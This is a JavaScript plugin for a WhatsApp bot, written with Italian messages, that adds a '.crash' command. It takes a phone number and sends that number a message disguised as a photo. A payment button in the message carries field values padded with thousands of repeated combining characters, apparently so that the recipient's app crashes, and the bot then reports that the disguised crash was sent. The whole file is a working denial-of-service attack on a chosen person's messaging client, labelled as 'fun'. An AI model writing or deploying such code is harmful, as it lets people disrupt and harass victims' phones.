let handler = async (m, { conn, args }) => {
  if (!args[0]) return m.reply('⚠️ Inserisci un numero.\nEsempio: `.crash numero`')
  let numi = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'

  await conn.relayMessage(numi, {
    interactiveMessage: {
      header: {
        title: "📸",
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://telegra.ph/file/2a2b8c2c6e84b2e123abc.jpg", // immagine camuffo innocente
          mimetype: "image/jpeg"
        }
      },
      body: {
        text: "Foto ricevuta 📷"
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"𝒄𝒓𝒂𝒔𝒉" + "ꦽ".repeat(4000) + "\",\"key\":\"𝒃𝒚.𝐃𝐄𝐀𝐓𝐇 𝒙 𝐂𝐇𝐀𝐓𝐔𝐍𝐈𝐓𝐘" + "ꦹ".repeat(4000) + "\",\"key_type\":\"EMAIL\"}}],\"share_payment_status\":false,\"referral\":\"chat_attachment\"}"
          }
        ]
      }
    }
  }, {
    additionalNodes: [
      {
        tag: "biz",
        attrs: { native_flow_name: "payment_info" }
      }
    ],
    participant: { jid: numi },
    userJid: numi
  })

  m.reply(`✅ Crash camuffato inviato a ${args[0]}`)
}

handler.command = /^crash$/i
handler.help = ['crash <numero>']
handler.tags = ['fun']

export default handler